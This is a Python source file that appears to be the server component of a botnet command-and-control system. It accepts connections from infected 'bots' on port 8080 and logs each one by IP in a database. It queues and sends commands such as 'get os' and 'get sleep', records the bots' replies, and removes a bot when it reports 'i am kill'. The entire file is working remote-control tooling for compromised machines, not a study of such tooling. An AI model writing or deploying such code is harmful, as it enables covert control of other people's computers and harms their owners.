from threading import Thread
from app import db
from models import Bot
import socket
from select import select
from functools import wraps
from datetime import datetime

queue = {}

def thread(func):
    @wraps(func)
    def async_func(*args, **kwargs):
        func_hl = Thread(target = func, args = args, kwargs = kwargs)
        func_hl.start()
        return func_hl
    return async_func

def main(port=8080):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(100)
    while 1:
        inp = select([s], [], [], 1)
        if inp[0]:
            (csock, addr) = s.accept()
            handle_client(csock, addr)

@thread
def handle_client(sock, addr):
    try:
        b = Bot.query.filter_by(ip=addr[0]).one()
    except:
        b = Bot(ip=addr[0])
    if not addr[0] in queue.keys():
        queue.update({addr[0]:list()})
        b.sleep_interval = None
    b.last_seen_time = datetime.now()
    if b.os == None and not "get os" in queue[addr[0]]:
        queue[addr[0]].append("get os")
    if b.sleep_interval == None and not "get sleep" in queue[addr[0]]:
        queue[addr[0]].append("get sleep")
    db.session.add(b)
    db.session.commit()
    inp = select([sock], [], [], 1)
    if inp[0]:
        action(sock.recv(2048), b)
    if addr[0] in queue.keys() and len(queue[addr[0]]) != 0:
        cmd = queue[addr[0]][0]
        queue[addr[0]].remove(cmd)
        sock.send(cmd)
        b.current_command = cmd
        db.session.add(b)
        db.session.commit()
    sock.close()

def action(data, bot):
    if data.startswith("set os:"):
        bot.os = data.split(":")[1]
    elif data.startswith("set sleep:"):
        bot.sleep_interval = int(data.split(":")[1])
    elif data == "i am kill":
        db.session.delete(bot)
        db.session.commit()
        del queue[bot.ip]
        return
    if data != "":
        bot.last_command = bot.current_command
        bot.last_response = data.decode('utf-8', 'ignore')
    db.session.add(bot)
    db.session.commit()
